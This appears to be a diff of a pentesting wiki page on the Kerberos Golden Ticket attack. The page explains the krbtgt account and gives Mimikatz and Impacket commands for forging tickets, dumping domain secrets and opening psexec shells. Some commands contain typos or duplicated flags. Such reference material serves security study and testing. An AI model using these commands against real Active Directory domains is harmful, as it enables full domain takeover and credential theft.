@@ -1,9 +1,19 @@
 # Golden Ticket
 
-#### Priv Required: <mark style="color:purple;">Domain Admin account</mark>
+#### Priv Required: <mark style="color:purple;">krbtgt account hash</mark>
 
-A **Golden Ticket attack** consist on the **creation** of a legitimate Ticket Granding Ticket (TGT) **impersonating any user** through the use of the NTLM hash of the Acrive Directory (AD) **krbtgt account**.\
-This tenchnique is particularly advantageos because it enables access to any service or machine within the domain as the impersonated user. It's crucial to remember that the krbtgt account's credentials are never automatically updated.
+KRBTGT is the account used for Microsoft's implementation of Kerberos. The name is derived from Kerberos (KRB) and Ticket Granting Ticket (TGT). Essentially, this account acts as the service account for the Kerberos Distribution Center (KDC) service, which handles all Kerberos ticket requests. This account is used to encrypt and sign all Kerberos tickets for the domain (includes all domain forest). Since the password hash is shared by all domain controllers of all forest, they can then verify the authenticity of the received TGT when users request access to resources.
+
+However, what if we want to generate our own TGTs to grant us access to everything? This is known as a **Golden Ticket attack**. In a Golden Ticket attack, we bypass the KDC altogether and create our own TGTs, essentially becoming a Ticket Granting Server (TGS). In order to forge TGTs, we need the following information:
+
+* The FQDN of the domain
+* The Security Identifier (SID) of the domain
+* The username of the account we want to impersonate
+* The KRBTGT password hash
+
+
+
+
 
 #### Necessary Elements:
 
@@ -104,23 +114,26 @@ Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:$DOMAIN.
 ```
 {% endcode %}
 
-> id:**500** or id:**512** it's a default id of administrator user in windows
+> id:**500** or group\_id:**512** it's a default id of administrator user in windows
 
 
 
 {% code title="From Linux - Impacket" overflow="wrap" %}
 ```bash
-cd /usr/share/doc/python3-impacket/examples/
 # Create the golden ticket (with an RC4 key, i.e. NT hash)
-ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "$RANDOMUSER"
+impacket-ticketer -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" "$RANDOMUSER" -groups 512 -user-id 1114
 
 # Create the golden ticket (with an AES 128/256bits key)
-ticketer.py -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser"
+impacket-ticketer -aesKey "$krbtgtAESkey" -domain-sid "$domainSID" -domain "$DOMAIN" "randomuser" -groups 512 -user-id $TARGET_USER_ID
 
 # Create the golden ticket (with an RC4 key, i.e. NT hash) with custom user/groups ids
-ticketer.py -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser"
+impacket-ticketer -nthash "$krbtgtNThash" -domain-sid "$domainSID" -domain "$DOMAIN" -user-id "$USERID" -groups "$GROUPID1,$GROUPID2,..." "randomuser" -groups 512 -user-id $TARGET_USER_ID
 ```
 {% endcode %}
+
+{% hint style="warning" %}
+Then target user must be in the Domain
+{% endhint %}
 
 
 
@@ -146,11 +159,17 @@ mimikatz > misc::cmd # this open cmd promt with current privileges
 ```bash
 export KRB5CCNAME=$(pwd)/NAME.ccache
 
-KRB5CCNAME="NAME.ccache" secretsdump -no-pass -k -dc-ip $DC_IP $DOMAIN.local/$NAME@$MACHINE.$DOMAIN.local
+imapcket-secretsdump -no-pass -k -dc-ip $DC_IP $DOMAIN.local/$NAME@$MACHINE.$DOMAIN.local
 ```
 {% endcode %}
 
+### psexec
 
+```bash
+export KRB5CCNAME=$(pwd)/NAME.ccache
+
+impacket-psexec administrator@<DC_IP> -k -no-pass
+```
 
 ## GoldenCopy
 
